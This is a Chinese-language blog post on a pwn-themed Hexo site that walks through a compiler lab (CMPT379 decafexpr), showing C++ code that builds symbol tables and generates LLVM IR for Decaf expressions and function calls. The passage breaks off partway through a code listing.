<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/13/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab3%EF%BC%9Adecafexpr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/13/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab3%EF%BC%9Adecafexpr/" class="post-title-link" itemprop="url">CMPT379编译器Lab3：decafexpr</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-13 00:10:47 / Modified: 00:12:18" itemprop="dateCreated datePublished" datetime="2023-07-13T00:10:47+08:00">2023-07-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>57k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>51 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>decafexpr</strong></p>
<p>本作业的目标是为变量编写一个代码生成器，用于处理 Decaf 编程语言的简单表达式和方法</p>
<p>输出将在 LLVM 程序集中，该程序集被编译为x86程序集，然后使用 LLVM 工具 <code>llvm-run</code> 编译为二进制文件（工具 <code>llvm-run</code> 一定要有执行权限）</p>
<p>第一步是为编译器编写符号表，Decaf 的结构和代码生成提示在 Decaf 规范中给出：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/decafspec.html">Decaf Programming Language Specification</a></p>
<p>在开始此实验之前，建议先完成 LLVM 的练习：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/llvm-practice.html">SFU Compilers class: LLVM Practice (anoopsarkar.github.io)</a> （这里介绍了一些 llvm api 的使用方式）</p>
<p><strong>实验描述</strong></p>
<p>本实验有两个步骤：</p>
<ul>
<li>实现可以跟踪变量和方法的符号表 </li>
<li>表达式的代码生成</li>
</ul>
<p>符号表是从标识符到任何信息的映射，需要编译器自动生成</p>
<p>符号表很容易用哈希表或映射实现，例如：cpp stl 的符号表的声明</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> map&lt;string, descriptor* &gt; symbol_table;</span><br></pre></td></tr></table></figure>
<p>其中描述符是包含有用信息的结构或类</p>
<p>在 Decaf 中允许隐藏一个变量声明（在作用域内声明一个变量，但在实际使用之前不对其进行初始化或赋值），这意味着块中标识符的新定义将导致新的描述符与标识符相关联，但一旦块终止必须恢复标识符的先前描述符</p>
<p>实现此本地作用域概念的一种简单方法是指定每个块可以在列表中创建新的符号表：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> list&lt;symbol_table &gt; symbol_table_list;</span><br><span class="line">symbol_table_list symtbl;</span><br></pre></td></tr></table></figure>
<p>如果一个变量的局部定义隐藏了同一变量名称的另一个定义，我们只需扫描从最近的一个开始的符号表列表，就可以获取该变量最近定义的描述符：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">descriptor* <span class="title">access_symtbl</span><span class="params">(string ident)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i : symtbl) &#123;</span><br><span class="line">        <span class="keyword">auto</span> find_ident = i.<span class="built_in">find</span>(ident);</span><br><span class="line">        <span class="keyword">if</span> (find_ident != i.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> find_ident-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为以下 Decaf 片段提供代码生成器，其中包括：</p>
<ul>
<li>算术和布尔表达式</li>
<li>函数调用</li>
<li>函数定义（包括递归函数）</li>
<li>外部函数的声明（所有外部函数都在 <code>decaf-stdlib.c</code> 中定义）</li>
</ul>
<p>LLVM 程序集和工具链输出将转储到目录 <code>llvm</code> 中，应检查输出以调试编译器，请务必遵守以下要求：</p>
<ul>
<li>如果程序成功解析输入 <code>exit(EXIT_SUCCESS)</code>，则应使用 退出程序</li>
<li>如果您的程序在输入的无咖啡因程序中发现错误，则应使用 <code>exit(EXIT_FAILURE)</code></li>
<li>您必须通过调用 <code>TheModule-&gt;print(errs(),nullptr)</code> 来转储 LLVM 程序集，其中模块的类型为 <code>llvm::Module*</code></li>
</ul>
<p>可以使用如下命令对程序进行打分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 zipout.py -r decafexpr</span><br><span class="line">python3 check.py</span><br></pre></td></tr></table></figure>
<p><strong>实验步骤</strong></p>
<p>首先需要把上一个实验的 <code>decafast.y decafast.lex decafast.cc</code> 放入本实验的 answer 目录，然后修改文件名称：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv decafast.lex decafexpr.lex</span><br><span class="line">mv decafast.y decafexpr.y  </span><br><span class="line">mv decafast.cc decafexpr.cc </span><br></pre></td></tr></table></figure>
<ul>
<li>修改 <code>decafexpr.lex decafexpr.y decafexpr.cc</code> 中的头文件引用</li>
<li>将 <code>default.y</code> 中有关 LLVM 的代码拷贝到 <code>decafexpr.y</code> 中</li>
<li>将 <code>default.cc</code> 中有关 LLVM 的代码拷贝到 <code>decafexpr.cc</code> 中</li>
</ul>
<p>本实验的目标就是将 decaf 代码转化为 llvm ir 代码，并且需要判断程序的语义是否错误，然后用 llvm 工具将 llvm ir 转化为二进制文件</p>
<p>先看一个简单的样例：对于类型提升的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line">package Test &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var x <span class="keyword">int</span>;</span><br><span class="line">        print_int(<span class="literal">true</span> &amp;&amp; <span class="literal">true</span>);</span><br><span class="line">        print_int(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line">        print_int(<span class="literal">false</span> &amp;&amp; <span class="literal">true</span>);</span><br><span class="line">        print_int(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  %x = alloca i32</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">1</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的实际传参类型和该函数定义的传参类型不同</li>
</ul>
<p>编译修改好的实验初始文件，尝试将该样例作为输入，输出的结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;Test&quot;</span></span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在的目标就是用 llvm api 去识别 decaf 的语法分析树，将其转化为 llvm ir</p>
<p>核心步骤就是在上一个实验的基础上进行修改，在合适的位置为其添加 llvm api，并在上一个实验的类中添加对应的 llvm 类指针和 <code>Codegen</code> 函数</p>
<ul>
<li>本实验采用从下往上分析法，和 llvm api 需要的执行顺序不同</li>
<li>因此只能把 llvm 相关操作写入 <code>Codegen</code>，当从下往上的分析结束时，就从上往下调用 <code>Codegen</code> 来构建 llvm ir</li>
</ul>
<p>接下来的实验目标就是为各个类补充 llvm api 指针和 <code>Codegen</code> 函数，我会依照几个实验案例来展示一些我认为比较棘手的问题（包括遇到的问题和解决思路）</p>
<p>首先是上述案例，需要解决的问题就是对传参类型不同的处理：</p>
<ul>
<li>一开始我打算直接修改 <code>true</code> 的类型，但后来发现直接修改类型会对后续 <code>true</code> 的使用产生影响（具体而言是影响了 <code>llvm::Value</code>）</li>
<li>然后选择将函数参数的 <code>llvm::Value</code> 提取出来，根据函数定义所规定的传参类型新定义一个 <code>llvm::Value</code>，并使用该 <code>llvm::Value</code> 调用 <code>CreateCall</code></li>
<li>最后在查看实验文档时发现了零扩展函数 <code>CreateZExt</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value * <span class="title">decafFunCall::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    llvm::Function * llvm_func = des-&gt;func;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Value *&gt; putsargs;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; putstypes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; arg : llvm_func-&gt;args()) &#123;</span><br><span class="line">        llvm::Type* func_type = arg.getType();</span><br><span class="line">        putstypes.push_back(func_type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para())&#123;</span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = (decafBinexp *)p;</span><br><span class="line">        llvm::Value* vt = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        llvm::Type* func_type = putstypes[i++];</span><br><span class="line">      </span><br><span class="line">        vt = Builder.CreateZExt(vt, func_type, <span class="string">&quot;zexttmp&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(exp-&gt;get_kind() != &quot;VariableExpr&quot;)&#123;</span></span><br><span class="line"><span class="comment">            llvm::ConstantInt* constantInt = llvm::dyn_cast&lt;llvm::ConstantInt&gt;(vt);</span></span><br><span class="line"><span class="comment">            if (constantInt) &#123;</span></span><br><span class="line"><span class="comment">                llvm::APInt apIntValue = constantInt-&gt;getValue();</span></span><br><span class="line"><span class="comment">                int intValue = apIntValue.getZExtValue();</span></span><br><span class="line"><span class="comment">                vt = llvm::ConstantInt::get(func_type, intValue);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125; </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        putsargs.push_back(vt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    llvm::Value *ret_value = Builder.CreateCall(llvm_func, putsargs);</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：对返回类型的处理同理</li>
</ul>
<p>接着分析下一个样例：对于表达式的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"></span><br><span class="line">package foo &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        var flag <span class="keyword">bool</span>;</span><br><span class="line">        var a, b, c <span class="keyword">bool</span>;</span><br><span class="line">        var size <span class="keyword">int</span>;</span><br><span class="line">        a = <span class="literal">true</span>;</span><br><span class="line">        b = <span class="literal">false</span>;</span><br><span class="line">        c = <span class="literal">true</span>;</span><br><span class="line">        flag = a || b &amp;&amp; !c;</span><br><span class="line">        size = <span class="number">1</span> &gt;&gt; <span class="number">3</span> + <span class="number">1</span> / <span class="number">-2</span> % <span class="number">10</span> - <span class="number">5</span> * <span class="number">2</span> / <span class="number">20</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        print_int(size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;foo&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  %flag = alloca i1</span><br><span class="line">  %a = alloca i1</span><br><span class="line">  %b = alloca i1</span><br><span class="line">  %c = alloca i1</span><br><span class="line">  %size = alloca i32</span><br><span class="line">  store i1 <span class="literal">true</span>, i1* %a</span><br><span class="line">  store i1 <span class="literal">false</span>, i1* %b</span><br><span class="line">  store i1 <span class="literal">true</span>, i1* %c</span><br><span class="line">  %a1 = load i1, i1* %a</span><br><span class="line">  %b2 = load i1, i1* %b</span><br><span class="line">  %c3 = load i1, i1* %c</span><br><span class="line">  %nottmp = <span class="keyword">xor</span> i1 %c3, <span class="literal">true</span></span><br><span class="line">  %andtmp = <span class="keyword">and</span> i1 %b2, %nottmp</span><br><span class="line">  %ortmp = <span class="keyword">or</span> i1 %a1, %andtmp</span><br><span class="line">  store i1 %ortmp, i1* %flag</span><br><span class="line">  store i32 <span class="number">0</span>, i32* %size</span><br><span class="line">  %size4 = load i32, i32* %size</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %size4)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个案例主要展示了如何处理表达式</li>
</ul>
<p>其中最困难的地方就是区别：一元运算类，二元运算类，常量类，变量类</p>
<p>我的做法是令二元运算类 decafBinexp 继承常量/变量类 decafAllexp，然后将一元运算类 decafUnaryexp 当成特殊的 decafBinexp</p>
<p>最后在 <code>decafBinexp::Codegen</code> 中分情况讨论，对于不同的类进行不同的处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK)&#123;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNot(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNeg(L , <span class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        llvm::Value *R = Exp2-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAdd(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSub(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateMul(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> remtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSRem(L, R, <span class="string">&quot;remtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSDiv(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ortmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateOr(L, R, <span class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> andtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAnd(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpEQ(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> netmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpNE(L, R, <span class="string">&quot;netmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLT(L, R, <span class="string">&quot;slttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGT(L, R, <span class="string">&quot;sgttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLE(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span 